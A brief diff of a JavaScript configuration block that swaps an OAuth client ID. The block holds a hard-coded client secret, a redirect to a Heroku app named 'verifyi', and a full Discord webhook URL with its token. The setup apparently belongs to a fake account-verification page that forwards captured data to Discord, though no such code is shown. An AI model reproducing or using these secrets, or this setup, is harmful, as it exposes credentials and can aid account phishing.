@@ -1,6 +1,6 @@
 // Configuration
 const client_secret = '-.d8Q~yQCAZ9lhsfFKjY44dQJ9SwFn3jVinUZbXK'
-const client_id = '708c2d73-5985-48f4-a273-0486f2c8d284'
+const client_id = 'b826b8d9-82bf-4988-9753-9c7040ad9fcb'
 const redirect_uri = 'https://verifyi.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1044103578777821215/7HDoE7vu9zbvX9sODukiY4Qut3OcpH6LoaJO3Ju1dE9KbPwM33lJAsLv7_gBZkAA9nK9'
 // Config end
